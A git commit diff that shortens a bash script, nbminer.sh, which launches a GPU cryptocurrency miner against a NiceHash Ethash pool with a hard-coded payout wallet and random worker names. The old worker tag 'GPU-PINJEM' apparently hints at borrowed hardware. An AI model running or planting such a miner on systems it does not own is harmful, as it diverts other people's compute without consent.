7988ec7f5e630f9cbd687d9c99ac65474c0c6065
angkii <83603708+angkii@users.noreply.github.com>
2021-07-21 00:42:18 +0700

    Update nbminer.sh

--- nbminer.sh
+++ nbminer.sh
@@ -1,11 +1,1 @@
-#!/bin/bash
-
-POOL=stratum+tcp://daggerhashimoto.eu.nicehash.com:3353
-
-WALLET=3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH
-
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
-
-chmod +x nb
-
-./nb --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./nb -a ethash -o nicehash+tcp://daggerhashimoto.eu-west.nicehash.com:3353 -u 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.$(echo $(shuf -i 1000-9999 -n 1)-NICE)
